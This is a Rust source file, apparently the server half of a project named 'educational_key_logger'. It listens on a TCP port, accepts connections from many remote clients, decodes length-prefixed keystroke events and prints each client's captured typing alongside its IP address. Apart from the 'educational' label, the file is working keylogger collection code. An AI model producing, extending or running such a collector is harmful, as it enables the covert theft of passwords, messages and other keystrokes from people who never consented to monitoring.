mod parser;
use educational_key_logger::IP_PORT;
use educational_key_logger::input::InputEvent;
use parser::input_events_to_text;
use std::io::{self, Read, Stdout};
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

const TIMEOUT_DURATION: Duration = Duration::from_secs(2);

fn main() {
    let listener = TcpListener::bind(IP_PORT).unwrap();
    let stdout_mutex = Arc::new(Mutex::new(io::stdout()));
    for stream in listener.incoming() {
        let stdout = stdout_mutex.clone();
        thread::spawn(move || {
            handle_stream(stream.unwrap(), stdout);
        });
    }
}

fn handle_stream(mut stream: TcpStream, stdout: Arc<Mutex<Stdout>>) {
    let mut buffer = [0; 1024];
    let mut stream_read_handler =
        StreamReadHandler::new(stdout.clone(), stream.peer_addr().unwrap());
    if let Err(e) = stream.set_read_timeout(Some(TIMEOUT_DURATION)) {
        eprintln!("Failed to set read timeout: {}", e);
        return;
    }
    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                let _guard = stdout.lock().unwrap();
                println!("Client disconnected");
                break;
            }
            Ok(bytes_read) => {
                stream_read_handler.read_buffer(&buffer[..bytes_read]);
            }
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                if !stream_read_handler.input_events.is_empty() {
                    stream_read_handler.handle_input_events();
                }
            }
            Err(e) => {
                let _guard = stdout.lock().unwrap();
                eprintln!("Read error: {}", e);
                break;
            }
        }
    }
}

struct StreamReadHandler {
    size_prefix: Option<u8>,
    /// Buffer for InputEvent. It's length can never exceed size_prefix which is sent through TCPStream.
    input_event_buffer: Vec<u8>,
    input_events: Vec<InputEvent>,
    stdout: Arc<Mutex<Stdout>>,
    peer_addr: SocketAddr,
}

impl StreamReadHandler {
    pub fn new(stdout: Arc<Mutex<Stdout>>, peer_addr: SocketAddr) -> StreamReadHandler {
        StreamReadHandler {
            size_prefix: None,
            input_event_buffer: vec![],
            input_events: vec![],
            stdout,
            peer_addr,
        }
    }
    pub fn read_buffer(&mut self, buffer: &[u8]) {
        let mut buffer_index = 0;
        while buffer_index < buffer.len() {
            match self.size_prefix {
                None => {
                    self.size_prefix = Some(buffer[buffer_index]);
                    // There'll be at least 1 byte in the buffer. Since bytes_read cannot be 0.
                    debug_assert!(
                        self.input_event_buffer.len() == 0,
                        "input_event_buffer wasn't cleared."
                    );
                    buffer_index += 1;
                }
                Some(size_prefix) => {
                    debug_assert!(
                        self.input_event_buffer.len() <= u8::MAX.into(),
                        "input_event_buffer is larger than 255 ({})",
                        self.input_event_buffer.len()
                    );
                    let available_space = size_prefix as usize - self.input_event_buffer.len();
                    let will_buffer_be_full = buffer.len() - buffer_index >= available_space;
                    if will_buffer_be_full {
                        self.input_event_buffer.extend_from_slice(
                            &buffer[buffer_index..(buffer_index + available_space)],
                        );
                        buffer_index += available_space;
                        self.input_event_buffer_full();
                    } else {
                        self.input_event_buffer
                            .extend_from_slice(&buffer[buffer_index..]);
                    }
                }
            };
        }
    }
    fn input_event_buffer_full(&mut self) {
        self.input_events.push(
            postcard::from_bytes(&self.input_event_buffer)
                .expect("Handler ensures complete and correctly framed InputEvent"),
        );
        self.input_event_buffer.clear();
        self.size_prefix = None;
    }

    fn handle_input_events(&mut self) {
        let input_events = std::mem::take(&mut self.input_events);
        let _guard = self.stdout.lock().unwrap();
        print!("{}: ", self.peer_addr);
        println!("{}", input_events_to_text(&input_events))
        // input_events.iter().for_each(|input_event| {
        //     if input_event.is_key_press() {
        //         print!("{}", input_event.code_as_string());
        //     }
        // });
        // println!();
    }
}
